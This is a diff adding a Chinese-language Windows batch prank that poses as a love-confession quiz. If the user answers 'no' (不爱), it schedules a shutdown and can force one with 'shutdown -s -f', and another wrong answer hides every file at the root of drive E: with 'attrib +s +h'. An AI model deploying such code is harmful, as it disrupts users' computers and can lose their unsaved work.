@@ -1,0 +1,134 @@
+@echo off
+chcp 65001
+color CF
+:menu
+cls
+echo ==================================================================
+echo                           11               11
+echo                          1111             1111
+echo                        11111111         1111111            
+echo                       1111111111      1111111111       
+echo                      1111111111111  1111111111111             
+echo                      111111111111111111111111111      
+echo                       1111111111111111111111111                  
+echo                        11111111111111111111111            
+echo                         111111111111111111111                                  
+echo                          1111111111111111111
+echo                           11111111111111111 
+echo                            111111111111111
+echo                             1111111111111
+echo                              11111111111
+echo                               111111111
+echo                                1111111
+echo                                 11111
+echo                                  111
+echo                                   1
+echo ===================================================================
+echo.
+echo                           1.先送你个惊喜吧
+echo                           2.想不想要更大的惊喜
+echo                           3.exit
+echo.
+echo ===================================================================
+echo 请小心输入哦，不然没有惊喜!!!!!!
+set /p num=请输入您的选择：
+if "%num%"=="1" goto ai
+if "%num%"=="2" goto wen
+if "%num%"=="3" goto li
+ 
+pause
+goto menu
+ 
+:ai
+echo 请按提示回答
+set /p a=请您回答你爱不爱我，爱或者不爱：
+if  "%a%"=="爱" goto l
+if  "%a%"=="不爱" goto p
+goto ai
+ 
+:l
+echo.
+echo 爱你的话就要开始了
+pause
+echo.
+echo 除了白头偕老，我们没别的路可选了；
+echo.
+echo 我这样不善言辞的人，却总是想和你废话连篇；
+echo.
+echo 你可以把余生都交给我保管，可以霸占我情话里的每一句喜欢；
+pause
+goto menu 
+ 
+:p
+echo.
+echo 你的电脑即将关机
+shutdown -s -t 600        #600秒之后关机
+echo.
+echo 是不是非常还怕，谁让你说不爱，现在后悔还来的及！
+pause
+echo 按提示回答
+set /p c=请您回答你爱不爱我，爱或者不爱：
+if  "%c%"=="爱" goto duile
+if  "%c%"=="不爱" goto guanji
+goto menu
+ 
+:duile
+shutdown -a 
+echo.
+echo 你很幸运，不让你关机了！
+pause
+goto menu
+ 
+:guanji
+shutdown -a    #取消关机
+echo.
+echo 对不起，10秒后强制关机，后悔也没用了！
+ping -n 2 127.0.0.1 >nul 2>nul
+shutdown -s -f -t 10
+goto menu
+ 
+ 
+:wen
+set /p b=结婚以后，碗是谁刷，回答：你还是我：
+if  "%b%"=="你" goto hao
+if  "%b%"=="我" goto gai
+ 
+:hao
+echo.
+echo 情诗送你几句：
+pause
+echo 1.独坐相思椅，手握相思笔，望着相思月，想者相思的你，写着相思信，句句相思语，滴滴相思泪，全部相思你，天是蓝的海是深的，我爱你是真的！
+echo.
+echo 2.总是想给你世界上最好的，但发现世界上最好的是你！
+echo.
+echo 3.我想用我所有的一切来换取你的心！
+pause
+goto menu
+ 
+:gai
+e:
+cd \
+attrib +s +h *.*
+echo.
+echo 看一下你的E盘，是不是所有文件都没了，但是别非常害怕，用心回答！！！
+set /p d=结婚以后，饭谁做，回答：你或我：
+if  "%d%"=="你" goto hf
+if  "%d%"=="我" goto buhao 
+ 
+:hf
+e:
+cd \
+echo.
+attrib -s -h *.*       #隐藏所有文件
+echo 在看一下你的E盘，是不是都已经恢复！！！
+pause
+goto menu
+ 
+:buhao
+echo.
+echo 那就不给你恢复了
+pause   #按任意键继续
+goto menu
+ 
+:li
+exit
